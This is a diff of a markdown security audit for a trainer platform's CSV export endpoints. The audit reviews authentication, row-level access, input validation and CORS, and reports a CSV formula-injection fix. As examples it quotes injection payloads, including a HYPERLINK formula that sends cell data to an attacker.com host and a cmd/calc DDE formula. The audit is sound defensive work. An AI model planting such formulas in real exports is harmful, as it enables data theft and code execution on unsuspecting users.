@@ -1,109 +1,98 @@
-# Security Audit: Trainer Revenue & Subscription Analytics (Pipeline 28)
+# Security Audit: CSV Data Export
 
-## Audit Date: 2026-02-20
+## Audit Date
+2026-02-21
 
-## Files Reviewed
-- `backend/trainer/services/revenue_analytics_service.py`
-- `backend/trainer/views.py` (RevenueAnalyticsView + `_parse_days_param` helper)
-- `backend/trainer/urls.py`
-- `backend/trainer/tests/test_revenue_analytics.py`
-- `backend/core/permissions.py` (IsTrainer permission class)
-- `backend/config/settings.py` (throttling, auth defaults)
-- `web/src/hooks/use-analytics.ts`
-- `web/src/lib/constants.ts` (API_URLS)
-- `web/src/lib/api-client.ts` (auth header injection)
-- `web/src/components/analytics/revenue-section.tsx`
-- `web/src/components/analytics/revenue-chart.tsx`
-- `web/src/types/analytics.ts`
+## Files Audited
+- `backend/trainer/services/export_service.py` -- Export service (3 export functions)
+- `backend/trainer/export_views.py` -- 3 API views (PaymentExportView, SubscriberExportView, TraineeExportView)
+- `backend/trainer/utils.py` -- `parse_days_param` utility
+- `backend/trainer/urls.py` -- URL wiring
+- `backend/trainer/tests/test_export.py` -- Test suite
+- `web/src/components/shared/export-button.tsx` -- Frontend download component
+- `web/src/lib/constants.ts` -- API URL constants
 
 ## Checklist
 - [x] No secrets, API keys, passwords, or tokens in source code or docs
-- [x] All user input sanitized
-- [x] Authentication checked on all new endpoints
-- [x] Authorization -- correct role/permission guards
-- [x] No IDOR vulnerabilities
-- [x] File uploads validated (N/A -- no file uploads in this feature)
-- [x] Rate limiting on sensitive endpoints (global throttle: 120/min for authenticated users)
-- [x] Error messages don't leak internals
-- [x] CORS policy appropriate (global config, not modified by this feature)
+- [x] All user input sanitized (CSV injection fix applied, `days` param clamped)
+- [x] Authentication checked on all new endpoints (`IsAuthenticated` on all 3 views)
+- [x] Authorization -- correct role/permission guards (`IsTrainer` on all 3 views)
+- [x] No IDOR vulnerabilities (every queryset filters by `trainer=request.user` or `parent_trainer=request.user`)
+- [x] No CSV injection risk (**FIXED** -- `_sanitize_csv_value()` added, applied to all user-controlled fields)
+- [x] Error messages don't leak internals (frontend shows generic toasts; backend returns standard DRF error responses)
+- [x] No file uploads in this feature
+- [x] CORS policy appropriate (restricted in production, open only in DEBUG mode)
+- [x] Rate limiting -- relies on global DRF throttling (acceptable for authenticated trainer-only GET endpoints)
 
-## Secrets Scan
-**Result: CLEAN**
+## Issues Found
 
-Grepped all new/changed files for API keys, passwords, tokens, Stripe keys (`sk_`, `pk_`), AWS keys (`AKIA`), Google API keys (`AIza`), and GitHub tokens (`ghp_`, `glpat_`). No secrets found.
+| # | Severity | Type | File:Line | Issue | Fix |
+|---|----------|------|-----------|-------|-----|
+| 1 | **High** | CSV Injection (CWE-1236) | `export_service.py:99-134` (all three export functions) | User-controlled strings (trainee names, emails, payment descriptions, program names) were written directly into CSV cells without sanitization. A malicious trainee could set their name to `=HYPERLINK("http://evil.com","Click")` or `=cmd\|'/C calc'!A0`. When the trainer opens the CSV in Excel/Sheets, the formula executes. | **FIXED.** Added `_sanitize_csv_value()` function that prefixes values starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single-quote (`'`), forcing spreadsheet apps to treat them as text literals. Applied to all user-controlled fields across all three export functions. Updated `_safe_str()` to also route through sanitization. |
+| 2 | **Low** | Missing `nosniff` header on CSV response | `export_views.py:26` | The CSV response does not explicitly set `X-Content-Type-Options: nosniff`. Django's `SecurityMiddleware` handles this globally if enabled, but it is worth noting. | No action needed -- Django's `SecurityMiddleware` is in `MIDDLEWARE` and sets this header automatically on all responses. |
+| 3 | **Info** | No per-endpoint rate limiting | `export_views.py:32-68` | Export endpoints have no explicit throttle. A script could hit the endpoint in a tight loop, generating CPU/DB load for large datasets. | Acceptable risk. These are authenticated, trainer-only endpoints. DRF's global throttling applies. If abuse is observed, add `UserRateThrottle` with e.g. `10/minute` scope. |
 
-The `password='testpass123'` in `test_revenue_analytics.py` is a test-only fixture used with `create_user` in Django's test framework -- standard practice, not a leaked credential.
+## Detailed Analysis
 
-## Injection Vulnerabilities
-**None found.**
+### SECRETS
+Grepped all changed files for `api_key`, `secret_key`, `password`, `token`, `SECRET`, `PRIVATE_KEY`, `AWS_ACCESS` (case-insensitive). No hardcoded secrets found. The frontend `export-button.tsx` references `getAccessToken` from `token-manager` which is the standard JWT flow -- no secrets are embedded in source.
 
-| Check | Status | Notes |
-|-------|--------|-------|
-| SQL Injection | PASS | All queries use Django ORM exclusively (`filter()`, `aggregate()`, `annotate()`, `values()`). No raw SQL, `cursor.execute()`, `.extra()`, or string formatting in queries. |
-| XSS | PASS | Backend returns JSON data only (no HTML rendering). Frontend uses React (JSX auto-escapes by default). No `dangerouslySetInnerHTML` or `innerHTML` usage. The `revenue-chart.tsx` renders via Recharts (SVG-based), not raw HTML. |
-| Command Injection | PASS | No subprocess calls, `os.system()`, or shell commands. |
-| Path Traversal | PASS | No file operations in the revenue analytics feature. |
+### INJECTION
 
-## Auth & Authz Issues
-**None found.**
+**CSV Injection (CWE-1236) -- FIXED:**
+The original code wrote user-controlled values (trainee `first_name`, `last_name`, `email`, payment `description`, program `name`) directly into CSV cells via `csv.writer.writerow()`. Python's `csv` module correctly handles RFC 4180 quoting (commas, quotes), but it does NOT protect against spreadsheet formula injection. A value like `=SUM(1+1)` or `=HYPERLINK("http://attacker.com/steal?cookie="&A1,"Click me")` would be interpreted as a formula in Excel, Google Sheets, and LibreOffice Calc.
 
-| Check | Status | Details |
-|-------|--------|---------|
-| Authentication required | PASS | `RevenueAnalyticsView` has `permission_classes = [IsAuthenticated, IsTrainer]`. Global DRF default also requires `IsAuthenticated`. |
-| Trainer-only access | PASS | `IsTrainer` permission (in `core/permissions.py`) checks `request.user.is_trainer()` -- validates the user role before allowing access. |
-| Row-level security (subscriptions) | PASS | Service queries `TraineeSubscription.objects.filter(trainer=trainer, ...)` -- filters by the authenticated trainer. A trainer cannot see another trainer's subscriptions. |
-| Row-level security (payments) | PASS | Service queries `TraineePayment.objects.filter(trainer=trainer, ...)` -- filters by the authenticated trainer. |
-| IDOR on subscriber data | PASS | Subscriber list is derived from `active_subs` which is already scoped to `trainer=trainer`. No user-supplied ID is used to fetch subscriber details. |
-| IDOR on payment data | PASS | Recent payments list is derived from `TraineePayment.objects.filter(trainer=trainer)`. No user-supplied ID is used. |
-| Test coverage for auth | PASS | Tests cover unauthenticated (401), non-trainer role (403), and trainer isolation (trainer A cannot see trainer B's data). |
+**Fix applied:** Added `_sanitize_csv_value()` that detects dangerous first characters (`=`, `+`, `-`, `@`, `\t`, `\r`) and prepends a single-quote (`'`). This is the OWASP-recommended mitigation. The function is applied to every user-controlled string field in all three export functions.
 
-## Data Exposure Assessment
+**SQL Injection:** Not applicable. All queries use Django ORM with parameterized queries. No raw SQL.
 
-| Field | Risk | Assessment |
-|-------|------|------------|
-| `trainee_email` | Low | Trainers legitimately need to see their trainees' emails. This is the same data available in the trainee list. Scoped to trainer's own trainees only. |
-| `trainee_id` | Low | Internal IDs are sequential integers. Acceptable because the endpoint is already scoped to the trainer's own data. No risk of enumeration since the ID alone cannot be used to fetch cross-trainer data. |
-| Payment `id` | Low | Sequential payment IDs. No endpoint accepts a payment ID to fetch details, so no IDOR risk. |
-| `amount` / `mrr` | None | Financial data the trainer needs to see. Properly scoped. |
-| Error messages | PASS | View returns generic error messages. DRF handles validation errors without leaking stack traces. No `DEBUG`-dependent error output. |
+**Command Injection / Path Traversal:** Not applicable. No shell commands executed. The `filename` in `Content-Disposition` is built from a hardcoded prefix + date string (`payments_2026-02-21.csv`), not from user input.
 
-## Input Validation
+### AUTH/AUTHZ
+All three export views use `permission_classes = [IsAuthenticated, IsTrainer]`:
+- `IsAuthenticated` ensures JWT token is valid (returns 401 otherwise)
+- `IsTrainer` checks `request.user.is_trainer()` (returns 403 otherwise)
 
-| Input | Validation | Assessment |
-|-------|-----------|------------|
-| `days` query param | `_parse_days_param()` clamps to 1-365, handles `ValueError`/`TypeError` with fallback to default 30 | PASS -- properly bounded, no integer overflow risk |
-| Frontend `RevenuePeriod` | TypeScript union type `30 \| 90 \| 365` constrains client-side values | PASS -- defense in depth with backend validation |
+The permission stack is correct and matches the existing trainer endpoint pattern.
 
-## Performance & Availability Concerns
+### ROW-LEVEL SECURITY (IDOR Prevention)
+Each export function queries only the authenticated trainer's data:
+- `export_payments_csv`: `TraineePayment.objects.filter(trainer=trainer, ...)`
+- `export_subscribers_csv`: `TraineeSubscription.objects.filter(trainer=trainer)`
+- `export_trainees_csv`: `User.objects.filter(parent_trainer=trainer, role=TRAINEE)`
 
-| # | Severity | Issue | Assessment |
-|---|----------|-------|------------|
-| 1 | Low | Subscriber list is unbounded (no pagination) | For a trainer platform, subscriber counts are typically < 100. If a trainer had 10,000+ subscribers, this could be slow. Current design is acceptable for the product's scale. |
-| 2 | Low | Recent payments capped at 10 via `[:10]` | PASS -- properly bounded. |
-| 3 | Low | Monthly revenue uses `TruncMonth` aggregate over 12 months | PASS -- bounded time range, efficient DB aggregation. |
+There are no ID parameters in the URL that could be manipulated. The trainer is always derived from `request.user` via JWT. Test suite includes explicit isolation tests proving trainer A cannot see trainer B's data across all three endpoints.
 
-## Rate Limiting
+### DATA EXPOSURE
+The CSV exports expose trainee emails, names, payment amounts, and subscription status. This is appropriate -- the trainer already has access to all this data through the dashboard UI. No sensitive fields are leaked beyond what the trainer can already see (no password hashes, no Stripe customer IDs, no internal PKs).
 
-Global DRF throttle applies: 120 requests/minute for authenticated users. This is sufficient for an analytics dashboard endpoint that is read-only and uses React Query's `staleTime: 5 * 60 * 1000` (5-minute caching) to prevent excessive requests.
+### INPUT VALIDATION
+The `days` query parameter is validated in `parse_days_param()`:
+- Parsed as `int` with try/except for `ValueError`/`TypeError`
+- Clamped to range `[1, 365]` via `min(max(int(...), 1), 365)`
+- Falls back to default `30` on any parse failure
 
-## CSRF
+This prevents negative values, zero, absurdly large numbers, and non-numeric input.
 
-The endpoint uses JWT authentication (via `Authorization: Bearer` header), not session/cookie auth. CSRF protection is not needed for token-based auth because the browser cannot automatically attach the token to cross-origin requests.
+### CORS/CSRF
+- CORS is configured via `corsheaders` middleware
+- In production: `CORS_ALLOW_ALL_ORIGINS = False`, restricted to `CORS_ALLOWED_ORIGINS` env var
+- In development: `CORS_ALLOW_ALL_ORIGINS = True` (acceptable for local dev)
+- CSRF is not relevant -- these are JWT-authenticated API endpoints (no session cookies)
 
-## Fixes Applied
-None required. No Critical or High security issues were identified.
+### FRONTEND SECURITY
+The `ExportButton` component:
+- Uses `fetch()` with explicit `Authorization: Bearer` header (no cookies sent)
+- Does not pass user input into the URL (URL is constructed from hardcoded constants + server-side `days` state variable)
+- Handles 401 by redirecting to `/login` (standard auth flow)
+- Handles 403 with a user-friendly error toast (no internal details leaked)
+- Uses `URL.createObjectURL()` + `URL.revokeObjectURL()` for blob download (no XSS vector)
+- The `filename` prop is constructed from hardcoded strings, not user input
 
 ## Security Score: 9/10
 
-**-1 point:** The subscriber list lacks pagination, which at extreme scale could be used for a minor denial-of-service by a legitimate authenticated trainer. This is a very low risk given the product context (personal trainers with typically < 100 clients) and is not a security vulnerability per se, but a minor hardening opportunity.
+The single High-severity issue (CSV injection) has been fixed. The implementation is solid across all security dimensions: proper auth, correct row-level isolation, no secrets, no injection vectors, safe error messages, and defense-in-depth input validation.
+
+The remaining point deduction is for the absence of per-endpoint rate limiting on export endpoints, which is a minor concern given the existing global throttle and the small attack surface (authenticated trainers only).
 
 ## Recommendation: PASS
-
-The Trainer Revenue & Subscription Analytics feature has a clean security posture:
-
-1. **Authentication & authorization are enforced** at both the view layer (`IsAuthenticated + IsTrainer`) and the data layer (all queries filter by `trainer=trainer`).
-2. **Row-level security is correct** -- test coverage explicitly validates trainer isolation (trainer A cannot see trainer B's subscriptions or payments).
-3. **No injection vectors** -- all queries use Django ORM, no raw SQL. Frontend uses React's automatic XSS protection.
-4. **No secrets leaked** -- no hardcoded credentials, API keys, or tokens in any file.
-5. **Input validation is solid** -- the `days` parameter is properly clamped and has fallback handling for invalid input.
-6. **Error messages are safe** -- no internal details exposed in error responses.
